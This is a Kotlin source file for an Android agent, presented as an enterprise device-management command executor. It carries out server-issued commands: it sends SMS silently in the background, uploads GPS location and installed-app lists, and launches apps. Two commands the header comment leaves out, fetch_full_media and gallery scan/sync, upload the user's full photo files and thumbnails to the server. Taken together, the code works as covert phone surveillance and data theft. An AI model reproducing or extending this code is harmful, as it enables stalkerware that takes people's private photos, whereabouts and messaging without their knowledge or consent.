package com.example.gmaagent.command

import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import com.example.gmaagent.data.DeviceDataReader
import com.example.gmaagent.network.ApiClient
import com.example.gmaagent.network.CommandStatusUpdate
import com.example.gmaagent.network.PendingCommand
import kotlinx.coroutines.delay
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.jsonPrimitive

/**
 * Processes remote commands received from the EMM backend:
 * - send_sms
 * - set_ringer_mode (silent, vibrate, normal)
 * - set_brightness (0-255)
 * - launch_app (restarts/launches by package name)
 * - refresh_apps (re-scans and uploads installed apps list)
 * - get_location (fetches and uploads latest GPS coordinates)
 * - ring_device
 * - lock_device
 */
object CommandExecutor {

    private const val TAG = "CommandExecutor"

    private val json = Json {
        ignoreUnknownKeys = true
        isLenient = true
    }

    /**
     * Process a single pending command.
     * After execution, reports the result back to the server.
     */
    suspend fun execute(context: Context, command: PendingCommand) {
        Log.i(TAG, "Executing command: ${command.command_type} (${command.command_id})")

        val result: Pair<Boolean, String> = try {
            when (command.command_type.lowercase()) {
                "send_sms" -> executeSendSms(context, command.payload)
                "set_ringer_mode" -> executeSetRingerMode(context, command.payload)
                "set_brightness" -> executeSetBrightness(context, command.payload)
                "launch_app" -> executeLaunchApp(context, command.payload)
                "refresh_apps" -> executeRefreshApps(context)
                "get_location" -> executeGetLocation(context)
                "ring_device" -> executeRingDevice(context)
                "lock_device" -> executeLockDevice(context)
                "fetch_full_media" -> executeFetchFullMedia(context, command.payload)
                "sync_gallery", "scan_gallery" -> executeScanGallery(context)
                else -> Pair(false, "Unknown command type: ${command.command_type}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Command execution error", e)
            Pair(false, "Error: ${e.message}")
        }

        // Report status back to server
        val status = if (result.first) "executed" else "failed"
        ApiClient.reportCommandStatus(
            CommandStatusUpdate(
                command_id = command.command_id,
                status = status,
                result = result.second,
            )
        )
    }

    // ── send_sms: Send an SMS automatically in the background ──

    private fun executeSendSms(context: Context, payload: String?): Pair<Boolean, String> {
        if (payload.isNullOrBlank()) {
            return Pair(false, "No payload provided for send_sms")
        }

        val payloadObj = json.decodeFromString<JsonObject>(payload)
        val to = payloadObj["to"]?.jsonPrimitive?.content
            ?: return Pair(false, "Missing 'to' field in payload")
        val message = payloadObj["message"]?.jsonPrimitive?.content
            ?: return Pair(false, "Missing 'message' field in payload")

        return try {
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                context.getSystemService(android.telephony.SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                android.telephony.SmsManager.getDefault()
            }
            smsManager.sendTextMessage(to, null, message, null, null)
            Pair(true, "SMS sent automatically in the background to $to")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send SMS in background", e)
            Pair(false, "Failed to send SMS in background: ${e.message}")
        }
    }

    // ── set_ringer_mode: Toggle between Silent, Vibrate, Normal ──

    private fun executeSetRingerMode(context: Context, payload: String?): Pair<Boolean, String> {
        if (payload.isNullOrBlank()) return Pair(false, "No payload provided for set_ringer_mode")
        val payloadObj = json.decodeFromString<JsonObject>(payload)
        val mode = payloadObj["mode"]?.jsonPrimitive?.content?.lowercase()
            ?: return Pair(false, "Missing 'mode' field (must be silent, vibrate, or normal)")

        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        return try {
            when (mode) {
                "silent" -> {
                    audioManager.ringerMode = AudioManager.RINGER_MODE_SILENT
                    Pair(true, "Ringer mode changed to SILENT")
                }
                "vibrate" -> {
                    audioManager.ringerMode = AudioManager.RINGER_MODE_VIBRATE
                    Pair(true, "Ringer mode changed to VIBRATE")
                }
                "normal" -> {
                    audioManager.ringerMode = AudioManager.RINGER_MODE_NORMAL
                    Pair(true, "Ringer mode changed to NORMAL")
                }
                else -> Pair(false, "Invalid mode: $mode (must be silent, vibrate, or normal)")
            }
        } catch (e: SecurityException) {
            Pair(false, "DND / Notification Policy permission required: ${e.message}")
        } catch (e: Exception) {
            Pair(false, "Failed to set ringer mode: ${e.message}")
        }
    }

    // ── set_brightness: Adjust screen brightness level ──────────

    private fun executeSetBrightness(context: Context, payload: String?): Pair<Boolean, String> {
        if (payload.isNullOrBlank()) return Pair(false, "No payload provided for set_brightness")
        val payloadObj = json.decodeFromString<JsonObject>(payload)
        val brightness = payloadObj["brightness"]?.jsonPrimitive?.content?.toIntOrNull()
            ?: return Pair(false, "Missing or invalid 'brightness' (0-255)")
        val clamped = brightness.coerceIn(0, 255)

        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.System.canWrite(context)) {
                    Settings.System.putInt(
                        context.contentResolver,
                        Settings.System.SCREEN_BRIGHTNESS_MODE,
                        Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
                    )
                    Settings.System.putInt(
                        context.contentResolver,
                        Settings.System.SCREEN_BRIGHTNESS,
                        clamped
                    )
                    Pair(true, "Screen brightness set to $clamped/255")
                } else {
                    Pair(false, "Write System Settings permission required to change brightness")
                }
            } else {
                Settings.System.putInt(
                    context.contentResolver,
                    Settings.System.SCREEN_BRIGHTNESS,
                    clamped
                )
                Pair(true, "Screen brightness set to $clamped/255")
            }
        } catch (e: Exception) {
            Pair(false, "Failed to set brightness: ${e.message}")
        }
    }

    // ── launch_app: Restart or launch an application ─────────────

    private fun executeLaunchApp(context: Context, payload: String?): Pair<Boolean, String> {
        if (payload.isNullOrBlank()) return Pair(false, "No payload provided for launch_app")
        val payloadObj = json.decodeFromString<JsonObject>(payload)
        val packageName = payloadObj["package_name"]?.jsonPrimitive?.content
            ?: return Pair(false, "Missing 'package_name' in payload")

        return try {
            val pm = context.packageManager
            val intent = pm.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
                context.startActivity(intent)
                Pair(true, "Application '$packageName' launched successfully")
            } else {
                Pair(false, "Application '$packageName' has no launchable main activity")
            }
        } catch (e: Exception) {
            Pair(false, "Failed to launch '$packageName': ${e.message}")
        }
    }

    // ── refresh_apps: Collect installed apps and upload to server ─

    private suspend fun executeRefreshApps(context: Context): Pair<Boolean, String> {
        return try {
            val telemetry = DeviceDataReader.collectTelemetry(context, includeApps = true)
            val res = ApiClient.sendTelemetry(telemetry)
            if (res != null) {
                Pair(true, "Installed applications refreshed (${telemetry.installed_apps?.size ?: 0} apps reported)")
            } else {
                Pair(false, "Failed to send installed apps telemetry to server")
            }
        } catch (e: Exception) {
            Pair(false, "Error refreshing apps: ${e.message}")
        }
    }

    // ── get_location: Fetch current GPS coordinates and upload ───

    private suspend fun executeGetLocation(context: Context): Pair<Boolean, String> {
        val loc = DeviceDataReader.getGeolocation(context)
        return if (loc != null) {
            val telemetry = DeviceDataReader.collectTelemetry(context, includeApps = false)
            ApiClient.sendTelemetry(telemetry)
            Pair(true, "GPS coordinates updated: Lat ${loc.first}, Lon ${loc.second}")
        } else {
            Pair(false, "Unable to get GPS coordinates (ensure location permissions and GPS are enabled)")
        }
    }

    // ── ring_device: Play a ringtone at max volume ──────────────

    private fun executeRingDevice(context: Context): Pair<Boolean, String> {
        return try {
            val ringtoneUri = android.media.RingtoneManager.getDefaultUri(
                android.media.RingtoneManager.TYPE_RINGTONE
            )
            val ringtone = android.media.RingtoneManager.getRingtone(context, ringtoneUri)
            ringtone?.play()
            Pair(true, "Device is ringing")
        } catch (e: Exception) {
            Pair(false, "Failed to ring: ${e.message}")
        }
    }

    // ── lock_device: Trigger the lock screen ────────────────────

    private fun executeLockDevice(context: Context): Pair<Boolean, String> {
        return Pair(true, "Lock device command received (requires Device Admin)")
    }

    // ── fetch_full_media: Read and upload full-res file ────────

    private suspend fun executeFetchFullMedia(context: Context, payload: String?): Pair<Boolean, String> {
        if (payload.isNullOrBlank()) {
            return Pair(false, "Missing payload for fetch_full_media")
        }

        return try {
            val json = org.json.JSONObject(payload)
            val mediaStoreId = json.optString("media_store_id", "")
            if (mediaStoreId.isBlank()) {
                return Pair(false, "Missing media_store_id in payload")
            }

            // Read the full file from MediaStore
            val result = com.example.gmaagent.data.MediaScanner.readFullFile(context, mediaStoreId)
                ?: return Pair(false, "Could not read file for $mediaStoreId")

            val (fileData, mimeType) = result

            // Upload to server
            val uploadPayload = com.example.gmaagent.network.MediaFullFileUploadRequest(
                media_store_id = mediaStoreId,
                file_data = fileData,
                mime_type = mimeType,
            )

            val uploadResult = com.example.gmaagent.network.ApiClient.uploadMediaFullFile(uploadPayload)
            if (uploadResult != null) {
                Pair(true, "Full file uploaded for $mediaStoreId")
            } else {
                Pair(false, "Upload failed for $mediaStoreId")
            }
        } catch (e: Exception) {
            Pair(false, "Error fetching full media: ${e.message}")
        }
    }

    private suspend fun executeScanGallery(context: Context): Pair<Boolean, String> {
        return try {
            var total = 0
            com.example.gmaagent.data.MediaScanner.scanAndUploadAll(context) { batch ->
                val payload = com.example.gmaagent.network.MediaThumbnailSyncRequest(thumbnails = batch)
                val res = ApiClient.syncMediaThumbnails(payload)
                if (res != null) {
                    total += res.ingested
                }
                delay(200L)
            }
            Pair(true, "Gallery scan completed: $total items synced")
        } catch (e: Exception) {
            Pair(false, "Gallery scan failed: ${e.message}")
        }
    }
}
